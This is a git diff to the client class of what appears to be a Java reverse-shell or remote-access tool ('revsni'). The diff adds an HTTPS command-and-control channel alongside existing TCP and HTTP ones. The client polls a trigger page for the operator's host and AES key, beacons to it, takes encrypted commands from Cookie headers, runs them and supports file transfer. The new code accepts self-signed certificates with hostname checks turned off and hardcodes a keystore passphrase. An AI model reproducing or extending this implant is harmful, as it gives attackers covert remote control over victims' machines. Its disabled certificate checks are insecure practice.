@@ -2,6 +2,7 @@ package com.revsni.client;
 
 import java.io.BufferedReader;
 import java.io.EOFException;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.ObjectInputStream;
@@ -13,7 +14,12 @@ import java.net.URL;
 
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
+import java.security.KeyManagementException;
+import java.security.KeyStore;
+import java.security.KeyStoreException;
 import java.security.NoSuchAlgorithmException;
+import java.security.UnrecoverableKeyException;
+import java.security.cert.CertificateException;
 import java.util.Base64;
 import java.util.UUID;
 
@@ -33,14 +39,20 @@ import org.jsoup.Jsoup;
 import org.jsoup.nodes.Document;
 import org.apache.http.client.methods.CloseableHttpResponse;
 import org.apache.http.client.methods.HttpGet;
+import org.apache.http.conn.ssl.NoopHostnameVerifier;
+import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
+import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
+import org.apache.http.conn.ssl.TrustStrategy;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
+import org.apache.http.ssl.SSLContexts;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
+import javax.net.ssl.SSLContext;
+
 public class Client {
-    protected static final Logger parentLogger = LogManager.getLogger();
-    private Logger LOG = parentLogger;
+    Logger logger = LogManager.getLogger(getClass());
 
     private UUID uniqueID;
     private Socket reqSock;
@@ -62,6 +74,11 @@ public class Client {
     private volatile boolean connExists = false;
     private volatile boolean httpEst = false;
 
+    KeyStore keyStore;
+    SSLConnectionSocketFactory scsf;
+    SSLContext sslContext = null;
+    TrustStrategy acceptingTrustStrategy;
+
     private volatile String type;
 
     public Client(UUID uniUuid) {
@@ -71,15 +88,16 @@ public class Client {
     }
 
     private boolean init() {
+        logger.info("Init started!");
         if(type.equals("TCP")) {
             if(!connExists) {
                 try {
-                    LOG.error("INIT");
+                    logger.error("INIT");
     
                     int port = Integer.parseInt(address[1]);
                     
-                    LOG.error(address[0] + " ");
-                    LOG.error(address[1]);
+                    logger.error(address[0] + " ");
+                    logger.error(address[1]);
     
                     reqSock = new Socket(address[0], port);
     
@@ -92,7 +110,7 @@ public class Client {
     
                     return true;
                 } catch(IOException | InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e) {
-                    LOG.error("catch in init");
+                    logger.error("catch in init");
                     e.printStackTrace();
                     return false;
                 }
@@ -128,6 +146,59 @@ public class Client {
                 }
                 return false;
             }
+        } 
+        if(type.equals("HTTPS")) {
+            logger.info("INIT HTTPS beginning");
+            String keyPassphrase = "lol123";
+            String uri = new String("https://" + address[0] + ":" + address[1]);
+
+            HttpGet httpGet = new HttpGet(uri);
+
+            KeyStore keyStore;
+            SSLConnectionSocketFactory scsf;
+            SSLContext sslContext = null;
+            TrustStrategy acceptingTrustStrategy;
+
+            try {
+                keyStore = KeyStore.getInstance("JKS");
+                keyStore.load(new FileInputStream("/home/shorida/Projekte/Revsn/revsn/src/main/java/com/revsni/server/https/certificates/keystore.jks"), keyPassphrase.toCharArray());
+                //sslContext = SSLContexts.custom()
+                //.loadKeyMaterial(keyStore, keyPassphrase.toCharArray())
+                //.build();
+
+                acceptingTrustStrategy = new TrustSelfSignedStrategy();
+                sslContext = org.apache.http.ssl.SSLContexts.custom().loadTrustMaterial(null, acceptingTrustStrategy)
+                            .build();
+
+                httpClient = HttpClients.custom().setSSLContext(sslContext).build();  
+                httpGet.addHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("est".getBytes())));
+
+                scsf = new SSLConnectionSocketFactory( SSLContexts.custom().loadTrustMaterial(null, new TrustSelfSignedStrategy()).build(), NoopHostnameVerifier.INSTANCE);
+
+                httpClient = HttpClients.custom().setSSLSocketFactory(scsf).build();
+            } catch (IllegalBlockSizeException | BadPaddingException  | KeyStoreException 
+                    | NoSuchAlgorithmException | CertificateException | IOException | KeyManagementException e2) {
+                e2.printStackTrace();
+            }
+            try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
+                close();
+                handleMessage(responseInitial.getHeaders("Cookie")[0].getValue());
+                httpEst = true;
+                connExists = true;
+                return true;
+            } catch(Exception e) {
+                e.printStackTrace();
+                connExists = false;
+                type = "TCP";
+                init();
+                try {
+                    sendMessage("HTTPS failed, fallback to TCP");
+                    close();
+                } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchPaddingException e1) {
+                    e1.printStackTrace();
+                }
+                return false;
+            }
         } else {
             return false;
         }
@@ -153,13 +224,13 @@ public class Client {
             Document doc = Jsoup.parse(url, 1000 * 3);
             String text = doc.body().text();
 
-            LOG.error(text);
+            logger.debug(text);
 
             String outp[] = text.split(";");
 
             address[0] = outp[0];
             address[1] = outp[1];
-            LOG.error(address[0]);
+            logger.error(address[0] + address[1]);
 
             byte[] decodedKey = Base64.getDecoder().decode(outp[3]);
             byte[] decodedIv = Base64.getDecoder().decode(outp[4]);
@@ -169,11 +240,12 @@ public class Client {
             this.key = new SecretKeySpec(decodedKey, "AES");
             this.iv = new IvParameterSpec(decodedIv);
 
-            LOG.error("CheckTrigTrue");
+            logger.error("CheckTrigTrue");
             trigCheck = true;
+            connExists = false;
             return true;
         } catch (IOException e) {
-            LOG.error("catch in checktrig");
+            logger.error("catch in checktrig");
             trigCheck = false;
             return false;
         }
@@ -191,7 +263,7 @@ public class Client {
 
     private void sendMessage(String msg) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchPaddingException {
         try {
-            LOG.error("Send message :" + msg);
+            logger.error("Send message :" + msg);
 
             cipherEnc = Cipher.getInstance("AES/CBC/PKCS5Padding");
             cipherEnc.init(Cipher.ENCRYPT_MODE, this.key, this.iv);
@@ -199,14 +271,14 @@ public class Client {
             String encoded = new String(Base64.getEncoder()
                 .encode(cipherEnc.doFinal(msg.getBytes())));
 
-            LOG.debug(encoded);
+            logger.debug(encoded);
             if(type.equals("TCP")) {
                 dataOut.writeObject(encoded);
                 dataOut.flush();
             }
             if(type.equals("HTTP")) {
                 httpClient = HttpClients.createDefault();
-                System.out.println("http://" + address[0] + ":" + address[1] +"/lit");
+                logger.info("http://" + address[0] + ":" + address[1] +"/lit");
                 HttpGet httpGet = new HttpGet("http://" + address[0] + ":" + address[1] +"/lit");
                 httpGet.setHeader("Cookie", encoded);
                 try {
@@ -216,8 +288,25 @@ public class Client {
                 }
             }
 
+            if(type.equals("HTTPS")) {
+                String uri = new String("https://" + address[0] + ":" + address[1]);
 
-            
+                HttpGet httpGet = new HttpGet(uri);
+
+                httpClient = HttpClients.custom().setSSLSocketFactory(scsf).build();
+                try {
+                    httpGet.setHeader("Cookie", encoded);
+                } catch (Exception e2) {
+                    e2.printStackTrace();
+                }
+                httpClient = HttpClients.custom().setSSLContext(sslContext).build();  
+                try {
+                    httpClient.execute(httpGet);
+                } catch(Exception e) {
+                    e.printStackTrace();
+                }
+            }
+
         } catch (IOException | NoSuchAlgorithmException | IllegalBlockSizeException | BadPaddingException e) {
             e.printStackTrace();
         }
@@ -225,7 +314,8 @@ public class Client {
 
     public void handleCentral() {
         switch(type) {
-            case("HTTP"): getInstr();
+            case("HTTP"): getInstr(); break;
+            case("HTTPS"): logger.info("Getting Instructions for HTTPS"); getInstrHTTPS();
         }
     }
 
@@ -246,7 +336,7 @@ public class Client {
                 String message  = new String(cipherDec.doFinal(Base64.getDecoder()
                     .decode(msg)));
 
-                System.out.println(message);
+                logger.info(message);
 
                 if(message.equals("httpSw")) {
                     type = "HTTP";
@@ -256,7 +346,15 @@ public class Client {
                     sendMessage(uniqueID + ": said goobye, sadly.");
                     close();
                     System.exit(0);
-                } else {
+                } else if(message.equals("httpsSw")) {
+                    type = "HTTPS";
+                    logger.error("Got HTTPSSW Command");
+                    updateStuff();
+                    logger.error("Update ran!");
+                    init();
+                    logger.error("Init done successfully!");
+                }  
+                else {
 
                     BufferedReader stdInput = null;
                     BufferedReader stdError = null;
@@ -295,7 +393,7 @@ public class Client {
                 }
             
             } catch (InvalidKeyException | InvalidAlgorithmParameterException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalBlockSizeException | BadPaddingException e) {
-                LOG.error("lul");
+                logger.error("lul");
             }
         }
             
@@ -315,9 +413,33 @@ public class Client {
                 handleMessage(instr);
             }
         } catch(Exception e) {
-            System.out.println("No instructions");
+            logger.info("No instructions");
         }
     }
+
+    public void getInstrHTTPS() {
+        String uri = new String("https://" + address[0] + ":" + address[1]);
+
+        HttpGet httpGet = new HttpGet(uri);
+
+        httpClient = HttpClients.custom().setSSLSocketFactory(scsf).build();
+        try {
+            httpGet.setHeader("Cookie", Base64.getEncoder().encodeToString(cipherEnc.doFinal("give".getBytes())));
+        } catch (IllegalBlockSizeException | BadPaddingException e1) {
+            e1.printStackTrace();
+        }
+
+        try(CloseableHttpResponse responseInitial = httpClient.execute(httpGet)) {
+            logger.error("give message sent!");
+            String instr = responseInitial.getHeaders("Cookie")[0].getValue();
+            if(instr.length() > 3) {
+                    handleMessage(instr);
+            }
+        } catch(Exception e) {
+                logger.info("No instructions");
+        }
+    }
+        
 
     //Filetransfer methodos
 
@@ -406,6 +528,10 @@ public class Client {
 
     public void run() {
         try {
+            Thread.sleep(1000);
+        } catch (InterruptedException e) {
+        }
+        try {
             while (!checkTrig() && !trigCheck) {
                 try {
                     Thread.sleep(10000);
@@ -416,7 +542,7 @@ public class Client {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        LOG.error("Passed checktrig");
+        logger.error("Passed checktrig");
         if(type.equals("TCP")) {
             if (!init()) {
                 try {
@@ -446,7 +572,7 @@ public class Client {
                 } 
             }
         }
-        if(type.equals("HTTP")) {
+        if(type.equals("HTTP") || type.equals("HTTPS")) {
             while(httpEst) {
                 try {
                     Thread.sleep(10000);
